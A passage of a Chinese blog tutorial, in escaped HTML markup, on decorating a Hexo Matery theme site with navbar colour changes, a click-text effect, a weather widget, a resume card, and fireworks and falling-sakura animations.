---`&lt;/pre&gt; ## [](#页尾鱼塘效果美化 &quot;页尾鱼塘效果美化&quot;)页尾鱼塘效果美化 效果： ![1](https://cdn.jsdelivr.net/gh/wkif/ImageHosting/img/20200814204700.gif) 教程：[个人博客搭建：网页页尾鱼塘效果美化](https://kifroom.icu/posts/63210.html) ## [](#修改导航栏颜色以及透明效果 &quot;修改导航栏颜色以及透明效果&quot;)修改导航栏颜色以及透明效果 效果： ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210442.png) 打开`themes/matery/source/css/matery.css`文件，大约在250行，有一个`.bg-color`属性，修改其属性值即可，代码如下： &lt;pre class=&quot;line-numbers language-css&quot;&gt;`&lt;span class=&quot;token selector&quot;&gt;&lt;span class=&quot;token class&quot;&gt;.bg-color&lt;/span&gt; &lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt; &lt;span class=&quot;token property&quot;&gt;background-image&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;linear-gradient&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;to right, &lt;span class=&quot;token hexcode&quot;&gt;#4cbf30&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0%&lt;/span&gt;, &lt;span class=&quot;token hexcode&quot;&gt;#0f9d58&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; //修改成自己喜欢的颜色值 &lt;span class=&quot;token property&quot;&gt;opacity&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0.8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; //透明效果 值范围 &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;~&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;，看情况自己修改 &lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt; ## [](#鼠标点击文字特效 &quot;鼠标点击文字特效&quot;)鼠标点击文字特效 实现方法，引入js文件，在主题文件下的`/source/js/`下新建`click_show_text.js`，其代码如下： &lt;pre class=&quot;line-numbers language-javascript&quot;&gt;`&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; a_idx &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;jQuery&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;document&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;ready&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;$&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;body&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;click&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;富强&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;民主&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;文明&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;和谐&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;自由&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;平等&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;公正&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;法治&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;爱国&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;敬业&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;诚信&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;友善&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; $i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&amp;lt;span/&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;a_idx&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; a_idx &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a_idx &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; a&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; x &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pageX&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; y &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pageY&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; $i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;css&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;z-index&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;top&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; y &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;left&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; x&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;position&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;absolute&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;font-weight&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;bold&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;color&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;#FF0000&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;body&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;$i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; $i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;animate&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;top&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; y &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;180&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;opacity&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt; $i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;delay()&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#123;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;.buryit&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;removeAttr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;onclick&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt; ## [](#添加天气小插件 &quot;添加天气小插件&quot;)添加天气小插件 首先去中国天气官网：[[https://cj.weather.com.cn/plugin/pc，](https://cj.weather.com.cn/plugin/pc，) [配置自己的插件，选择自定义插件—&amp;gt;自定义样式——&amp;gt;生成代码，然后会生成一段代码，复制粘贴到`themes/matery/layout/layout.ejs`即可。 ## [](#关于我页面添加个人简历 &quot;关于我页面添加个人简历&quot;)关于我页面添加个人简历 打开`theme/matery/layout/about.ejs`文件，大约在13行。有一个``标签，找出其对应结尾的标签，大约在61行左右，然后在新增如下代码： &lt;pre class=&quot;line-numbers language-html&quot;&gt;`&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;card&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;card-content&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;card-content article-card-content&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;title center-align&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;data-aos&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;zoom-in-up&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;i&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;fa fa-address-book&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;i&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token entity&quot; title=&quot;&amp;nbsp;&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;&lt;span class=&quot;token entity&quot; title=&quot;&amp;nbsp;&quot;&gt;&amp;amp;nbsp;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;%-&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;__(&#39;个人简历&#39;)&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;articleContent&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;data-aos&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;fade-up&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;%-&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;page.content&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt; 注意粘贴的位置和空格要正确，这里的位置随你自己设置，你也可以把简历作为第一个card，然后`/source/about/index.md`下面写上你的简历了（就像写博客一样）。 ## [](#添加鼠标点击烟花爆炸效果 &quot;添加鼠标点击烟花爆炸效果&quot;)添加鼠标点击烟花爆炸效果 效果： ![2](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210735.gif) 首先在`themes/matery/source/js`目录下新建`fireworks.js`文件，打开这个网址[传送门](https://links.jianshu.com/go?to=https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fbaifeng66%2Fcdn%401.1%2Fsource%2Fjs%2Ffireworks.js)，将内容复制粘贴到`fireworks.js`即可。 然后再`themes/matery/layout/layout.ejs`文件内添加下面的内容： &lt;pre class=&quot;line-numbers language-javascript&quot;&gt;`&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;canvas &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;fireworks&quot;&lt;/span&gt; style&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;canvas&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;script type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; src&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;script&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;script type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; src&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/js/fireworks.js&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;script&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;`&lt;/pre&gt; 然后`hexo clean &amp;amp;&amp;amp; hexo g &amp;amp;&amp;amp; hexo s`即可，就可以看到效果了。 ## [](#添加樱花飘落效果 &quot;添加樱花飘落效果&quot;)添加樱花飘落效果 在`themes/matery/source/js`目录下新建`sakura.js`文件，打开这个网址[传送门](https://links.jianshu.com/go?to=https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fbaifeng66%2Fcdn%401.1%2Fsource%2Fjs%2Fsakura.js)，将内容复制粘贴到sakura.js即可。 然后再`themes/matery/layout/layout.ejs`文件内添加下面的内容： &lt;pre class=&quot;line-numbers language-javascript&quot;&gt;`&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;script type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token comment&quot; 